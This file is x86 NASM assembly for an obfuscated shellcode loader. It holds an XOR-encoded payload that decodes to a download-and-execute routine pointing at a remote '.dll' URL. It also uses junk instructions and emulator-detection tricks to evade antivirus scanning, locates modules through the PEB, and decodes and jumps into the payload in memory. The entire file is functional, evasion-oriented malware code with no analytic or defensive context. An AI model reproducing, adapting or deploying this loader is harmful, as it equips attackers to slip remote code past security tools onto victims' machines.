BITS 32
%define OrginalShellcode 0x22, 0xF6, 0xEA, 0xEA, 0xD7, 0x40, 0xF0, 0x19, 0x6D, 0x9F, 0xEA, 0xD7, 0x19, 0x6D, 0x40, 0xF0, 0x9E, 0xEF, 0x52, 0x40, 0xF0, 0x19, 0x6D, 0x63, 0xAF, 0x16, 0xDB, 0x2A, 0x8E, 0x61, 0xAA, 0xDA, 0x61, 0xAA, 0xE6, 0x61, 0xAA, 0xF6, 0x61, 0xB2, 0xE2, 0x63, 0xB7, 0x12, 0x61, 0xEA, 0x63, 0xAF, 0x1E, 0x61, 0xA9, 0xD6, 0x61, 0xAE, 0xF2, 0x92, 0xEB, 0x32, 0x63, 0xAF, 0x1A, 0x61, 0xA2, 0xF2, 0xBA, 0xDB, 0x2A, 0xD3, 0x2B, 0x9F, 0xEC, 0xB2, 0x61, 0xAF, 0x1E, 0x01, 0x33, 0xB2, 0x61, 0xAF, 0x1A, 0x61, 0xB7, 0x12, 0x61, 0xAA, 0xCA, 0xEB, 0x32, 0x61, 0xAE, 0x62, 0x16, 0xEB, 0x32, 0xDB, 0x31, 0xD8, 0xF2, 0x8C, 0x2B, 0x21, 0xEB, 0xAA, 0x6A, 0xD2, 0xEA, 0x9F, 0x1E, 0xD8, 0xF2, 0x8C, 0x2B, 0x21, 0xEB, 0xAA, 0x8C, 0xD1, 0xB7, 0x16, 0x0A, 0x3E, 0x61, 0xAF, 0x1E, 0x9F, 0x4D, 0x61, 0xB7, 0x12, 0x61, 0xAF, 0x1A, 0x61, 0xAA, 0xCE, 0xEB, 0x32, 0xE5, 0x5D, 0xEE, 0xA2, 0xBA, 0x61, 0xB7, 0x1A, 0x61, 0xA9, 0xF6, 0x61, 0xB7, 0x12, 0xEB, 0x32, 0xB0, 0xE9, 0xF6, 0x7A, 0xDB, 0x2A, 0x5E, 0xEB, 0x6B, 0x97, 0x16, 0x19, 0x6D, 0x40, 0xF0, 0x9E, 0xD1, 0xC3, 0x2E, 0x8C, 0xBA, 0x82, 0x86, 0x87, 0x85, 0x84, 0x8C, 0x82, 0x9F, 0x98, 0xBE, 0x15, 0x39, 0xB9, 0x52, 0x19, 0x6D, 0x40, 0xF0, 0x02, 0xBB, 0x15, 0x15, 0x15, 0x82, 0x9E, 0x9E, 0x9A, 0xD0, 0xC5, 0xC5, 0x89, 0x82, 0x8F, 0x89, 0x81, 0x87, 0x93, 0x8F, 0x87, 0x8B, 0x83, 0x86, 0xC4, 0x85, 0x98, 0x8D, 0xC5, 0x9E, 0x8F, 0x99, 0x9E, 0xC4, 0x8E, 0x86, 0x86, 0x63, 0xB7, 0x06, 0xB2, 0xB1, 0x63, 0xB7, 0x02, 0x80, 0xCA, 0xB3, 0xA3, 0x60, 0xF6, 0xE2, 0x62, 0xF6, 0xE6, 0x9F, 0x1D, 0x80, 0xCA, 0xB3, 0xDB, 0x2A, 0x62, 0xEE, 0xE6, 0x63, 0x0A, 0x67, 0xB7, 0x0E, 0xB9, 0xDB, 0x23, 0xBB, 0xDB, 0x23, 0xBB, 0xDB, 0x23, 0xBB, 0x51, 0xEA, 0xEB, 0xEA, 0xEA, 0xB9, 0x67, 0xB7, 0x0E, 0xB9, 0xBA, 0xDB, 0x23, 0xBB, 0x61, 0xB7, 0x02, 0xB9, 0x61, 0xB7, 0x06, 0x15, 0x09, 
fchs
TEST EDX, 24694
fscale
XOR  EDX, EDX
MOV ECX, EDX
fsub
CMP EDX, 239
MOV EDI, EDI
BTR EBX, EBX
XOR EDX, EDX
MOV EDX, ECX
MOV  ECX, [FS:EDX + 0x30]
CMOVE EDI, EDI
CMOVB EDI, EDI
LEA EDI, [EDI + 110]
fprem1
MOV ESI, 0x0C
MOV  ECX, [ECX + ESI]
fnclex
AND EDX, EDX
ADD EDX, 40580
MOV  ECX, [ECX + 0x1C]
fptan
LEA ESI, [ESI + 113]
BTC EBX, EBX
MOV EDX, EDX
TEST EDI, 2645
MOV ESI, 0x08
XOR ESI, 22
XOR ESI, 22
MOV  EAX, [ECX + ESI]
CMOVG ESI, ESI
fnclex
LEA EDI, [EDI - 199]
fldpi
CMOVLE EBX, EBX
fldln2
XOR  ESI, ESI
AND EBP, ESI
frndint
fldln2
fpatan
fnclex
frndint
fldln2
fpatan
fnclex
MOV ESI, 0xFFFFFFFF
INC ESI
CMP EAX, ESI
fmul
fprem
fabs
fyl2xp1
JNZ  GO_DECODE
fucompp
fmul
fsincos
f2xm1
EMU_CHECK:
INC EDI
MOV EBX, 6450
fpatan
IN AX, 231
GO_DECODE:
FLD1
FSAVE [ESP-40]
XOR EBX, EBX
JZ DECODE_BASE
db  OrginalShellcode
DECODE_BASE:
MOV ECX, [ESP-28]
ADD ECX, 15
MOV EBX, [0x7ffe002c]
CMP EBX, 0x014c014c
JZ DECODE_SHELLCODE
OUT 5, AX
fsin
LEA EDX, [EDX]
DECODE_SHELLCODE:
BTR EDX, EDX
SAL EDI, 122
NOP EBX
CMOVNAE EDI, EDI
PUSH ECX
POP ESI
MOV  AL, [ESI]
XCHG EBX, EBX
TEST EDX, EDX
fldln2
fnop
CMOVNBE EDI, EDI
CMOVE EDX, EDX
XOR  AL, 234
fyl2x
fcom
ftst
PUSH ECX
POP EDI
MOV  [EDI], AL
XOR EBX, 58302
fprem
XCHG ESI, ESI
TEST EDX, EDX
XOR EBX, EBX
INC EBX
ADD ECX, EBX
fnop
XADD EDI, EDI
CMOVA EDI, EDI
LEA EDI, [EDI - 59]
CMOVB EDX, EDX
INC EBX
INC  EBP
fsub
CMOVBE EBX, EBX
fmul
INC EDX
fchs
SHR EDI,148
CMP  EBP, 296
fsub
fprem1
fyl2x
fdiv
JNZ  DECODE_SHELLCODE
CMOVG EDX, EDX
fnclex
LEA EBX, [EBX - 135]
fldpi
MOV EDI, ECX
SUB EDI, 296
MOV ECX, EDI
fucom
CMOVC ESI, ESI
AND EDX, 7703
fxam
PUSH ECX
POP ESI
CALL ESI
CMP EDI, EDI
fprem1
fprem1
fdiv
